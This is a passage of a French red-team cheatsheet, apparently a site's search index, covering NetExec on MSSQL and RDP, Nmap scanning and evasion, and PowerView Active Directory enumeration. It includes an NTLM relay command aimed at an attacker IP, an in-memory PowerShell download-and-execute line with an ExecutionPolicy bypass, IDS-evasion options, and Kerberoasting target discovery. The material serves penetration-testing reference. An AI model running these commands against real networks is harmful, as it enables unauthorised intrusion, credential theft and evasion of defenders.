connect\u00e9\nnetexec mssql &lt;cible&gt; -u &lt;user&gt; -p &lt;pass&gt; -M mssql_priv\n\n# Tenter un relais NTLM via xp_dirtree (si l'utilisateur a les droits)\n# (Lancez Responder/ntlmrelayx avant)\nnetexec mssql &lt;cible&gt; -u &lt;user&gt; -p &lt;pass&gt; -M ntlmrelay -o RHOST=&lt;ip_attaquant&gt;\n</code></pre> <ul> <li> <p>Contexte : Interaction directe avec les serveurs MSSQL.</p> </li> <li> <p>Usage : \u00c9num\u00e9ration de bases de donn\u00e9es, ex\u00e9cution de requ\u00eates, potentielle ex\u00e9cution de commandes syst\u00e8me ou relais NTLM si l'utilisateur a les privil\u00e8ges suffisants (<code>sysadmin</code> pour <code>xp_cmdshell</code>, <code>public</code> peut suffire pour <code>xp_dirtree</code>).</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/NetExec/#protocole-rdp-remote-desktop-protocol","title":"\ud83d\udda5\ufe0f Protocole RDP (Remote Desktop Protocol)","text":"<pre><code># V\u00e9rifier si RDP est ouvert et si NLA est requis\nnetexec rdp &lt;cible&gt;\n\n# Tenter une connexion (v\u00e9rifier les identifiants)\nnetexec rdp &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt;\n\n\n\n# Prendre un screenshot de la session RDP (si une session est active)\nnetexec rdp &lt;cible&gt; -u &lt;user&gt; -p &lt;pass | -H hash&gt; --screenshot screenshot.png [--screentime &lt;secondes&gt;]\n</code></pre> <ul> <li> <p>Contexte : Interaction avec le service RDP.</p> </li> <li> <p>Usage : V\u00e9rification d'acc\u00e8s, validation d'identifiants, capture d'\u00e9cran (moins courant pour l'exploitation directe compar\u00e9 \u00e0 SMB/WINRM).</p> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/","title":"Nmap","text":"<p>Objectif : Nmap (Network Mapper) est un outil open-source incontournable pour l'exploration de r\u00e9seaux et l'audit de s\u00e9curit\u00e9. Il permet de d\u00e9couvrir des h\u00f4tes, les ports ouverts, les services en cours d'ex\u00e9cution, les syst\u00e8mes d'exploitation, et de d\u00e9tecter des vuln\u00e9rabilit\u00e9s via son moteur de scripts (NSE).</p> <p>Source : https://github.com/nmap/nmap | https://nmap.org/</p> <p>Syntaxe G\u00e9n\u00e9rale : <code>nmap [Type(s) de Scan] [Options] {cible}</code></p>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/#options-courantes","title":"\u2699\ufe0f Options Courantes","text":"<ul> <li><code>-iL &lt;fichier_cibles&gt;</code> : Lit les cibles depuis un fichier.</li> <li><code>-p &lt;ports&gt;</code> : Sp\u00e9cifie les ports \u00e0 scanner (ex: <code>-p 22</code>, <code>-p 1-100</code>, <code>-p U:53,T:21-25,80</code>). <code>-p-</code> pour scanner tous les 65535 ports TCP.</li> <li><code>-F</code> : Scan Rapide (moins de ports que le scan par d\u00e9faut).</li> <li><code>-n</code> : Ne pas faire de r\u00e9solution DNS (acc\u00e9l\u00e8re le scan).</li> <li><code>-Pn</code> : Ne pas faire de d\u00e9couverte d'h\u00f4te (ping scan) - Traiter toutes les cibles comme si elles \u00e9taient en ligne. Utile si les pings ICMP sont bloqu\u00e9s.</li> <li><code>-v</code> / <code>-vv</code> : Augmente le niveau de verbosit\u00e9 (plus d'informations pendant le scan).</li> <li><code>-oN &lt;fichier.nmap&gt;</code> : Sauvegarde la sortie au format normal.</li> <li><code>-oX &lt;fichier.xml&gt;</code> : Sauvegarde la sortie au format XML.</li> <li><code>-oG &lt;fichier.gnmap&gt;</code> : Sauvegarde la sortie au format \"grepable\".</li> <li><code>-oA &lt;basename&gt;</code> : Sauvegarde la sortie dans les trois formats principaux (<code>.nmap</code>, <code>.xml</code>, <code>.gnmap</code>).</li> <li><code>-T&lt;0-5&gt;</code> : D\u00e9finit le template de timing (0=parano\u00efaque, 1=discret, 2=poli, 3=normal, 4=agressif, 5=fou). <code>-T4</code> est souvent un bon compromis vitesse/discr\u00e9tion.</li> <li><code>--min-rate &lt;paquets/sec&gt;</code> : Envoie au moins ce nombre de paquets par seconde.</li> <li><code>--max-retries &lt;nombre&gt;</code> : Nombre maximal de retransmissions de paquets.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/#decouverte-dhotes-ping-scan","title":"\ud83c\udfaf D\u00e9couverte d'H\u00f4tes (Ping Scan)","text":"<ul> <li>Objectif : Identifier rapidement quels h\u00f4tes sont actifs sur un r\u00e9seau sans scanner leurs ports.</li> </ul> <pre><code># Ping Scan simple (ICMP Echo, TCP SYN sur 443, TCP ACK sur 80, ICMP Timestamp)\nnmap -sn &lt;cible | plage_reseau&gt;\n</code></pre> <ul> <li>Contexte : \u00c9tape initiale de reconnaissance pour cartographier les machines actives.</li> <li>Usage : Rapide et l\u00e9ger pour d\u00e9terminer la port\u00e9e du r\u00e9seau \u00e0 analyser plus en profondeur.</li> <li>OPSEC : Moins bruyant qu'un scan de ports, mais les pings peuvent \u00eatre d\u00e9tect\u00e9s ou bloqu\u00e9s.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/#scan-de-ports","title":"\ud83d\udeaa Scan de Ports","text":"<ul> <li>Objectif : Identifier quels ports TCP ou UDP sont ouverts, ferm\u00e9s ou filtr\u00e9s sur une cible.</li> </ul> <pre><code># Scan TCP SYN (Half-Open) - D\u00e9faut pour utilisateur root\nnmap -sS &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Envoie un paquet SYN, attend un SYN/ACK (port ouvert) ou RST (port ferm\u00e9). Ne compl\u00e8te pas la connexion TCP.</li> <li>Usage : Scan rapide et relativement discret, souvent le choix par d\u00e9faut.</li> <li>Pr\u00e9requis : N\u00e9cessite des privil\u00e8ges root (ou \u00e9quivalent) pour cr\u00e9er des paquets bruts.</li> <li>OPSEC : Plus discret que le scan Connect (<code>-sT</code>) car la connexion n'est pas \u00e9tablie, mais reste d\u00e9tectable par les IDS/IPS.</li> </ul> <pre><code># Scan TCP Connect - D\u00e9faut pour utilisateur non-root\nnmap -sT &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Utilise l'appel syst\u00e8me <code>connect()</code> pour \u00e9tablir une connexion TCP compl\u00e8te.</li> <li>Usage : Alternative si <code>-sS</code> n'est pas possible (pas de droits root). Plus fiable dans certains cas mais plus lent.</li> <li>OPSEC : Tr\u00e8s bruyant car il \u00e9tablit des connexions compl\u00e8tes, facilement logu\u00e9 par la cible.</li> </ul> <pre><code># Scan UDP\nnmap -sU &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Envoie des paquets UDP aux ports sp\u00e9cifi\u00e9s. L'interpr\u00e9tation des r\u00e9ponses (ou absences de r\u00e9ponse) est complexe (ICMP Port Unreachable = ferm\u00e9, r\u00e9ponse UDP = ouvert, pas de r\u00e9ponse = ouvert|filtr\u00e9).</li> <li>Usage : D\u00e9couverte de services UDP (DNS, SNMP, DHCP...). Souvent combin\u00e9 avec <code>-sV</code>.</li> <li>OPSEC : Tr\u00e8s lent car UDP est sans connexion et Nmap doit g\u00e9rer les timeouts et les limitations de d\u00e9bit ICMP.</li> </ul> <pre><code># Scans TCP Avanc\u00e9s (FIN, Xmas, Null)\nnmap -sF &lt;cible&gt;  # Scan FIN\nnmap -sX &lt;cible&gt;  # Scan Xmas (Flags FIN, PSH, URG)\nnmap -sN &lt;cible&gt;  # Scan Null (Aucun flag)\n</code></pre> <ul> <li>Contexte : Envoient des paquets TCP avec des combinaisons de flags sp\u00e9cifiques. Exploite les subtilit\u00e9s de la RFC 793 pour diff\u00e9rencier les ports ouverts et ferm\u00e9s (un port ferm\u00e9 devrait r\u00e9pondre par RST, un port ouvert devrait ignorer).</li> <li>Usage : Tentatives de scans plus discrets, peuvent parfois contourner certains firewalls/IDS simples.</li> <li>OPSEC : Efficacit\u00e9 variable selon l'OS cible (fonctionne bien sur UNIX, moins sur Windows). Facilement d\u00e9tectable par des IDS modernes.</li> </ul> <pre><code># Scan TCP ACK\nnmap -sA &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Envoie des paquets ACK. Ne d\u00e9termine pas si un port est ouvert, mais peut aider \u00e0 d\u00e9terminer si un port est filtr\u00e9 par un firewall stateful (RST re\u00e7u = non filtr\u00e9, pas de r\u00e9ponse ou ICMP Unreachable = filtr\u00e9).</li> <li>Usage : Cartographie des r\u00e8gles de firewall.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/#detection-de-versions-et-os","title":"\ud83d\udd2c D\u00e9tection de Versions et OS","text":"<ul> <li>Objectif : Identifier le service exact tournant sur un port ouvert, sa version, et le syst\u00e8me d'exploitation de la cible.</li> </ul> <pre><code># D\u00e9tection des versions des services\nnmap -sV &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Se connecte aux ports ouverts et envoie une s\u00e9rie de sondes pour analyser les banni\u00e8res et les r\u00e9ponses afin d'identifier le service et sa version.</li> <li>Usage : Essentiel pour identifier les vuln\u00e9rabilit\u00e9s potentielles li\u00e9es \u00e0 des versions sp\u00e9cifiques de logiciels.</li> <li>OPSEC : Plus interactif et donc plus bruyant qu'un simple scan de ports.</li> </ul> <pre><code># D\u00e9tection de l'OS\nnmap -O &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Analyse les r\u00e9ponses TCP/IP (fen\u00eatre TCP, options, s\u00e9quencement ISN, r\u00e9ponses ICMP...) pour deviner le syst\u00e8me d'exploitation de la cible.</li> <li>Usage : Comprendre l'environnement cible.</li> <li>Pr\u00e9requis : N\u00e9cessite au moins un port ouvert et un port ferm\u00e9 sur la cible pour \u00eatre fiable.</li> <li>OPSEC : Peut \u00eatre d\u00e9tect\u00e9. La fiabilit\u00e9 d\u00e9pend de la cible.</li> </ul> <pre><code># Scan Agressif (Combine -sV, -O, -sC, --traceroute)\nnmap -A &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Raccourci pratique pour lancer plusieurs scans utiles en une seule commande : d\u00e9tection OS (<code>-O</code>), d\u00e9tection de version (<code>-sV</code>), scan avec scripts par d\u00e9faut (<code>-sC</code>) et traceroute.</li> <li>Usage : Scan de reconnaissance complet et rapide.</li> <li>OPSEC : Tr\u00e8s bruyant en raison de la combinaison de plusieurs techniques intrusives.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/#techniques-de-contournement-et-evasion","title":"\ud83d\ude92 Techniques de Contournement et \u00c9vasion","text":"<ul> <li>Objectif : Tenter de rendre le scan moins d\u00e9tectable par les firewalls et IDS/IPS.</li> </ul> <pre><code># Fragmentation des paquets\nnmap -f &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Divise les paquets TCP en plus petits fragments.</li> <li>Usage : Peut parfois contourner des filtres de paquets ou IDS anciens qui ne r\u00e9assemblent pas correctement les fragments.</li> <li>OPSEC : Efficacit\u00e9 limit\u00e9e contre les syst\u00e8mes modernes.</li> </ul> <pre><code># Sp\u00e9cifier un MTU (Maximum Transmission Unit)\nnmap --mtu &lt;multiple_de_8&gt; &lt;cible&gt;\n# Exemple: nmap --mtu 8 &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Similaire \u00e0 <code>-f</code>, mais permet un contr\u00f4le plus fin sur la taille des fragments.</li> <li>Usage : Technique d'\u00e9vasion.</li> </ul> <pre><code># Utiliser des leurres (Decoys)\nnmap -D RND:10,&lt;votre_ip&gt;,&lt;ip_leurre1&gt;,ME &lt;cible&gt;\n# RND:10 : 10 adresses IP al\u00e9atoires\n# ME : Votre propre adresse IP (position importante)\n</code></pre> <ul> <li>Contexte : Envoie des paquets de scan semblant provenir d'autres adresses IP (leurres) en plus de la v\u00f4tre.</li> <li>Usage : Tente de masquer votre adresse IP r\u00e9elle dans les logs de la cible.</li> <li>OPSEC : Ne fonctionne que si la cible ne filtre pas les paquets par IP source. Peut inonder la cible et les leurres. N\u00e9cessite des privil\u00e8ges root.</li> </ul> <pre><code># Sp\u00e9cifier un port source\nnmap --source-port &lt;port&gt; &lt;cible&gt;\n# Exemple: nmap -g 53 &lt;cible&gt; (utiliser le port 53, souvent autoris\u00e9)\n</code></pre> <ul> <li>Contexte : Force Nmap \u00e0 utiliser un port source sp\u00e9cifique (ex: 53 pour DNS, 80 pour HTTP) au lieu d'un port al\u00e9atoire.</li> <li>Usage : Peut contourner des firewalls simples qui filtrent sur le port source.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/#nmap-scripting-engine-nse","title":"\ud83d\udcdc Nmap Scripting Engine (NSE)","text":"<ul> <li>Objectif : Automatiser des t\u00e2ches de reconnaissance et de d\u00e9tection de vuln\u00e9rabilit\u00e9s gr\u00e2ce \u00e0 des scripts Lua.</li> </ul> <pre><code># Ex\u00e9cuter les scripts par d\u00e9faut (consid\u00e9r\u00e9s comme s\u00fbrs)\nnmap -sC &lt;cible&gt;\n# Souvent combin\u00e9 avec -sV : nmap -sV -sC &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Lance une s\u00e9lection de scripts NSE jug\u00e9s utiles et non intrusifs pour la reconnaissance.</li> <li>Usage : D\u00e9couverte d'informations suppl\u00e9mentaires sur les services (titres de pages web, partages SMB, etc.).</li> </ul> <pre><code># Ex\u00e9cuter des scripts d'une cat\u00e9gorie sp\u00e9cifique (ex: vuln\u00e9rabilit\u00e9s)\nnmap --script=vuln &lt;cible&gt;\n</code></pre> <ul> <li>Contexte : Lance tous les scripts appartenant \u00e0 la cat\u00e9gorie <code>vuln</code>.</li> <li>Usage : D\u00e9tection automatis\u00e9e de vuln\u00e9rabilit\u00e9s connues.</li> <li>OPSEC : Peut \u00eatre tr\u00e8s intrusif et potentiellement dangereux selon les scripts ex\u00e9cut\u00e9s. \u00c0 utiliser avec pr\u00e9caution.</li> </ul> <pre><code># Ex\u00e9cuter un script sp\u00e9cifique\nnmap --script=&lt;nom_script&gt; &lt;cible&gt;\n# Exemple: nmap -p 445 --script=smb-os-discovery &lt;cible&gt;\n</code></pre> <ul> <li>Usage : Lancer un script pr\u00e9cis pour une t\u00e2che sp\u00e9cifique.</li> </ul> <pre><code># Ex\u00e9cuter plusieurs scripts ou utiliser des wildcards\nnmap --script \"http-*\" &lt;cible&gt; # Tous les scripts commen\u00e7ant par http-\nnmap --script \"smb-enum-*,smb-vuln-*\" &lt;cible&gt; # Scripts d'\u00e9num\u00e9ration et de vuln\u00e9rabilit\u00e9 SMB\n</code></pre> <ul> <li>Usage : Cibler des ensembles de scripts pour une analyse plus approfondie d'un service.</li> </ul> <pre><code># Passer des arguments \u00e0 un script\nnmap --script &lt;nom_script&gt; --script-args &lt;arg1=val1,arg2=val2&gt; &lt;cible&gt;\n# Exemple: nmap -p 80 --script http-enum --script-args http-enum.fingerprintfile=custom_fingerprints.txt &lt;cible&gt;\n</code></pre> <ul> <li>Usage : Personnaliser le comportement de certains scripts NSE.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Nmap/#exemples-de-scripts-nse-utiles","title":"Exemples de Scripts NSE Utiles :","text":"<ul> <li><code>http-title</code>: R\u00e9cup\u00e8re le titre des pages web.</li> <li><code>smb-os-discovery</code>: Tente de d\u00e9terminer l'OS via SMB.</li> <li><code>smb-enum-shares</code>: \u00c9num\u00e8re les partages SMB.</li> <li><code>smb-vuln-*</code>: Recherche des vuln\u00e9rabilit\u00e9s SMB sp\u00e9cifiques (ex: <code>smb-vuln-ms17-010</code>).</li> <li><code>ssl-enum-ciphers</code>: \u00c9num\u00e8re les chiffrements SSL/TLS support\u00e9s.</li> <li><code>dns-zone-transfer</code>: Tente un transfert de zone DNS.</li> <li><code>ftp-anon</code>: V\u00e9rifie si une connexion FTP anonyme est possible.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/","title":"PowerView","text":"<p>Objectif : PowerView est un module PowerShell faisant partie de la suite PowerSploit. Il est sp\u00e9cialis\u00e9 dans l'\u00e9num\u00e9ration et l'exploitation d'environnements Active Directory (AD). Il permet de cartographier le domaine, trouver des utilisateurs, groupes, ordinateurs, GPOs, ACLs, et identifier des chemins potentiels d'escalade de privil\u00e8ges ou de mouvement lat\u00e9ral.</p> <p>Source : https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#chargement-de-powerview","title":"\ud83d\ude80 Chargement de PowerView","text":"<ul> <li>M\u00e9thode 1 : Fichier local <pre><code># Naviguer vers le dossier contenant PowerView.ps1\nImport-Module .\\PowerView.ps1\n</code></pre></li> <li>M\u00e9thode 2 : T\u00e9l\u00e9chargement et ex\u00e9cution en m\u00e9moire (bypass) <pre><code># Attention : Peut \u00eatre d\u00e9tect\u00e9 par les antivirus/EDR\nIEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)')\n</code></pre></li> </ul> <p>[!Attention] L'ex\u00e9cution de scripts PowerShell peut \u00eatre restreinte par la politique d'ex\u00e9cution (<code>ExecutionPolicy</code>). Utilisez <code>Set-ExecutionPolicy Bypass -Scope Process</code> pour la contourner temporairement dans la session courante (si autoris\u00e9).</p>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#exploration-du-domaine-et-de-la-foret","title":"\ud83d\udd0d Exploration du Domaine et de la For\u00eat","text":""},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#informations-sur-le-domaine-actuel","title":"Informations sur le domaine actuel","text":"<pre><code>Get-NetDomain\n</code></pre> <ul> <li>Contexte : R\u00e9cup\u00e8re les informations de base sur le domaine AD auquel la machine actuelle est jointe (nom, SID, contr\u00f4leurs de domaine, niveau fonctionnel...).</li> <li>Usage : Point de d\u00e9part pour comprendre l'environnement AD actuel.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#informations-sur-un-domaine-specifique","title":"Informations sur un domaine sp\u00e9cifique","text":"<pre><code>Get-NetDomain -Domain &lt;nom_domaine&gt;\n</code></pre> <ul> <li>Contexte : Interroge un autre domaine (accessible via une relation de confiance ou si un DC est sp\u00e9cifi\u00e9).</li> <li>Usage : \u00c9num\u00e9ration de domaines dans une for\u00eat ou des domaines approuv\u00e9s.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-un-controleur-de-domaine-dc","title":"Trouver un contr\u00f4leur de domaine (DC)","text":"<pre><code>Get-NetDomainController [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : Identifie les contr\u00f4leurs de domaine pour le domaine actuel ou un domaine sp\u00e9cifi\u00e9.</li> <li>Usage : Trouver les serveurs KDC et LDAP cibles pour d'autres requ\u00eates.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#informations-sur-la-foret-actuelle","title":"Informations sur la for\u00eat actuelle","text":"<pre><code>Get-NetForest [-Forest &lt;nom_foret&gt;]\n</code></pre> <ul> <li>Contexte : Obtient des informations sur la for\u00eat AD (domaines membres, catalogue global...).</li> <li>Usage : Comprendre la structure globale si plusieurs domaines existent.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-domaines-de-la-foret","title":"Lister les domaines de la for\u00eat","text":"<pre><code>Get-NetForestDomain [-Forest &lt;nom_foret&gt;]\n</code></pre> <ul> <li>Contexte : \u00c9num\u00e8re tous les domaines appartenant \u00e0 la for\u00eat actuelle ou sp\u00e9cifi\u00e9e.</li> <li>Usage : Cartographie compl\u00e8te des domaines au sein de la for\u00eat.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-les-serveurs-de-catalogue-global-gc","title":"Trouver les serveurs de Catalogue Global (GC)","text":"<pre><code>Get-NetForestCatalog [-Forest &lt;nom_foret&gt;]\n</code></pre> <ul> <li>Contexte : Identifie les serveurs GC, qui contiennent une copie partielle des objets de tous les domaines de la for\u00eat.</li> <li>Usage : Utile pour des recherches rapides \u00e0 l'\u00e9chelle de la for\u00eat.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#utilisateurs-et-groupes","title":"\ud83d\udc65 Utilisateurs et Groupes","text":""},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#informations-sur-un-utilisateur","title":"Informations sur un utilisateur","text":"<pre><code>Get-NetUser [-UserName &lt;nom_utilisateur&gt;] [-Properties *] [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : R\u00e9cup\u00e8re les attributs d'un ou plusieurs utilisateurs (par d\u00e9faut l'utilisateur courant).</li> <li>Usage : Obtenir des d\u00e9tails sur un utilisateur (SID, groupes, description, date de derni\u00e8re connexion...). <code>-Properties *</code> est crucial pour voir tous les attributs.</li> <li>Astuce : Utilisez <code>-LDAPFilter</code> pour des recherches complexes (ex: <code>Get-NetUser -LDAPFilter '(description=*admin*)' -Properties description</code>).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-tous-les-utilisateurs-du-domaine","title":"Lister tous les utilisateurs du domaine","text":"<pre><code>Get-NetUser -Domain &lt;nom_domaine&gt; | select SamAccountName, Description, PwdLastSet, LastLogonDate\n</code></pre> <ul> <li>Contexte : \u00c9num\u00e8re tous les comptes utilisateurs du domaine.</li> <li>Usage : Obtenir une liste compl\u00e8te des utilisateurs pour d'autres analyses (spraying, recherche de comptes inactifs...).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-les-utilisateurs-avec-spn-kerberoastable","title":"Trouver les utilisateurs avec SPN (Kerberoastable)","text":"<pre><code>Get-NetUser -SPN -Properties serviceprincipalname, samaccountname\n</code></pre> <ul> <li>Contexte : Identifie les comptes utilisateurs configur\u00e9s avec un Service Principal Name (SPN), les rendant potentiellement vuln\u00e9rables au Kerberoasting.</li> <li>Usage : Trouver des cibles pour extraire des TGS et tenter de cracker leur mot de passe hors ligne.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#informations-sur-un-groupe","title":"Informations sur un groupe","text":"<pre><code>Get-NetGroup [-GroupName &lt;nom_groupe&gt;] [-Properties *] [-FullData] [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : R\u00e9cup\u00e8re les informations sur un ou plusieurs groupes AD.</li> <li>Usage : Obtenir les d\u00e9tails d'un groupe (SID, membres, description...). <code>-FullData</code> fournit plus d'informations.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-tous-les-groupes-du-domaine","title":"Lister tous les groupes du domaine","text":"<pre><code>Get-NetGroup -Domain &lt;nom_domaine&gt; | select SamAccountName, GroupCategory, Description\n</code></pre> <ul> <li>Contexte : \u00c9num\u00e8re tous les groupes du domaine.</li> <li>Usage : Identifier les groupes potentiellement privil\u00e9gi\u00e9s (Admins, DnsAdmins, etc.).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-les-membres-dun-groupe-recursivement","title":"Trouver les membres d'un groupe (r\u00e9cursivement)","text":"<pre><code>Get-NetGroupMember -GroupName &lt;nom_groupe&gt; [-Recurse] [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : Liste les membres (utilisateurs, groupes, ordinateurs) d'un groupe sp\u00e9cifique.</li> <li>Usage : Comprendre qui a les privil\u00e8ges associ\u00e9s \u00e0 un groupe. <code>-Recurse</code> explore les groupes imbriqu\u00e9s.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-groupes-dappartenance-dun-utilisateur","title":"Lister les groupes d'appartenance d'un utilisateur","text":"<pre><code>Get-NetGroup -UserName &lt;nom_utilisateur&gt; [-Domain &lt;nom_domaine&gt;]\n# Alternative :\nGet-NetUser -Identity &lt;nom_utilisateur&gt; -Properties MemberOf | Select -ExpandProperty MemberOf\n</code></pre> <ul> <li>Contexte : D\u00e9termine \u00e0 quels groupes un utilisateur appartient.</li> <li>Usage : \u00c9valuer les privil\u00e8ges d'un utilisateur compromis.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#exploration-des-ordinateurs","title":"\ud83d\udcbb Exploration des Ordinateurs","text":""},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-tous-les-ordinateurs-du-domaine","title":"Lister tous les ordinateurs du domaine","text":"<pre><code>Get-NetComputer [-FullData] [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : \u00c9num\u00e8re les objets ordinateur dans l'AD.</li> <li>Usage : Identifier les serveurs, postes de travail, et potentiellement les contr\u00f4leurs de domaine. <code>-FullData</code> ou <code>-Properties *</code> pour plus de d\u00e9tails (OS, etc.).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-des-ordinateurs-avec-un-os-specifique","title":"Trouver des ordinateurs avec un OS sp\u00e9cifique","text":"<pre><code>Get-NetComputer -OperatingSystem \"*Server 2016*\" -Domain &lt;nom_domaine&gt;\n</code></pre> <ul> <li>Contexte : Filtre les ordinateurs par cha\u00eene de caract\u00e8res dans leur attribut OperatingSystem.</li> <li>Usage : Cibler des types sp\u00e9cifiques de machines (ex: anciens OS, serveurs).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#tester-la-connectivite-ping-des-ordinateurs","title":"Tester la connectivit\u00e9 (Ping) des ordinateurs","text":"<pre><code>Get-NetComputer -Ping [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : Tente de pinger chaque ordinateur trouv\u00e9 dans l'AD.</li> <li>Usage : V\u00e9rifier rapidement quels ordinateurs sont en ligne (peut \u00eatre bloqu\u00e9 par un pare-feu).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#sessions-et-acces-local","title":"\ud83d\udd04 Sessions et Acc\u00e8s Local","text":"<p>[!Attention] Ces commandes interrogent les machines distantes et n\u00e9cessitent souvent des privil\u00e8ges (admin local sur la cible) et g\u00e9n\u00e8rent du trafic r\u00e9seau potentiellement d\u00e9tectable.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-sessions-actives-sur-un-ordinateur","title":"Lister les sessions actives sur un ordinateur","text":"<pre><code>Get-NetSession -ComputerName &lt;nom_ordi_ou_ip&gt;\n</code></pre> <ul> <li>Contexte : Interroge la machine cible pour savoir quels utilisateurs ont des sessions SMB ouvertes vers elle.</li> <li>Usage : Identifier qui acc\u00e8de aux ressources d'un serveur sp\u00e9cifique.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-utilisateurs-connectes-sur-une-machine","title":"Lister les utilisateurs connect\u00e9s sur une machine","text":"<pre><code>Get-NetLoggedon -ComputerName &lt;nom_ordi_ou_ip&gt;\n</code></pre> <ul> <li>Contexte : Tente de d\u00e9terminer quels utilisateurs sont actuellement connect\u00e9s (localement ou via RDP) sur la machine cible.</li> <li>Usage : Trouver o\u00f9 des utilisateurs sp\u00e9cifiques (ex: admins) sont connect\u00e9s.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-les-machines-ou-lutilisateur-courant-a-des-droits-admin-local","title":"Trouver les machines o\u00f9 l'utilisateur courant a des droits admin local","text":"<pre><code>Find-LocalAdminAccess [-ComputerName &lt;liste_ordis&gt;] [-Verbose]\n</code></pre> <ul> <li>Contexte : Tente de se connecter \u00e0 l'IPC$ ou au registre des machines cibles pour v\u00e9rifier si l'utilisateur courant a des droits d'administrateur local.</li> <li>Usage : Identifier des cibles pour le mouvement lat\u00e9ral si l'utilisateur courant a des privil\u00e8ges sur d'autres machines.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-ou-des-utilisateursgroupes-specifiques-sont-connectes-ou-ont-des-droits-admin","title":"Trouver o\u00f9 des utilisateurs/groupes sp\u00e9cifiques sont connect\u00e9s ou ont des droits admin","text":"<pre><code>Find-DomainUserLocation -UserGroupIdentity &lt;nom_utilisateur_ou_groupe&gt; [-CheckAccess] [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : Combine <code>Get-NetLoggedon</code> et <code>Get-NetSession</code> pour trouver o\u00f9 un utilisateur/groupe est potentiellement actif.</li> <li>Usage : Chasse aux sessions d'utilisateurs privil\u00e9gi\u00e9s. <code>-CheckAccess</code> tente de v\u00e9rifier les droits admin local (plus intrusif).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#gestion-des-politiques-de-groupe-gpo","title":"\ud83c\udfdb\ufe0f Gestion des Politiques de Groupe (GPO)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#lister-les-gpo-du-domaine","title":"Lister les GPO du domaine","text":"<pre><code>Get-NetGPO [-ComputerName &lt;nom_ordi&gt;] [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : \u00c9num\u00e8re toutes les GPO du domaine ou celles appliqu\u00e9es \u00e0 un ordinateur sp\u00e9cifique.</li> <li>Usage : Identifier les politiques de s\u00e9curit\u00e9, les d\u00e9ploiements logiciels, les scripts de d\u00e9marrage/connexion.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/PowerView/#trouver-les-gpo-modifiant-les-groupes-locaux-restricted-groups-group-policy-preferences","title":"Trouver les GPO modifiant les groupes locaux (Restricted Groups / Group Policy Preferences)","text":"<pre><code>Get-NetGPOGroup [-Domain &lt;nom_domaine&gt;]\n</code></pre> <ul> <li>Contexte : Recherche sp\u00e9cifiquement les GPO qui configurent l'appartenance des groupes locaux sur les machines (ex: ajout d'un groupe AD au groupe Administrateurs local).</li> <li>Usage : Identifier des GPO qui pourraient accorder des 